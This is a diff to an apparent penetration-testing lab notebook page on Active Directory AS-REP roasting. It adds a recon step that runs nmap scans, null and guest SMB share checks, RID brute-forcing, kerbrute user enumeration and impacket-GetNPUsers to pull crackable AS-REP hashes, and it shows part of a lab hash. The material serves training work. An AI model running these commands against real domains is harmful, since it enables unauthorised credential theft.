@@ -49,9 +49,35 @@ impacket-GetNPUsers 'DOMAIN/' -dc-ip DC_IP -usersfile users.txt -no-pass -format
 
 ## Notebook recipes
 
-5 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+6 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
+
+<Accordion title="Step 1: Unauthenticated Recon, User List &amp; Initial Domain Credential">
+
+### Step 1: Unauthenticated Recon, User List & Initial Domain Credential
+
+**AD Enumeration & Attacks: Skills Assessment Hub**
+
+```bash
+# Map open ports, domain FQDN, and DC hostname
+nmap -sC -sV -p 53,80,88,135,139,389,443,445,636,3268,3389,5985 TARGET_IP -oA nmap/ad-part1
+
+# Null / guest checks & RID cycling if permitted
+nxc smb TARGET_IP -u '' -p '' --shares
+nxc smb TARGET_IP -u 'guest' -p '' --rid-brute
+kerbrute userenum -d DOMAIN_FQDN --dc DC_IP usernames.txt
+impacket-GetNPUsers DOMAIN_FQDN/ -dc-ip DC_IP -usersfile usernames.txt -no-pass -format hashcat -outputfile asrep.hash
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD Enumeration & Attacks: Skills Assessment Hub — Step 1: Unauthenticated Recon, User List & Initial Domain Credential](/active-directory/assessment#step-1-unauthenticated-recon-user-list-&-initial-domain-credential)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
 
 <Accordion title="Request the artifact and preserve output">
 
@@ -200,6 +226,8 @@ $krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8
 - [Official documentation 1](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
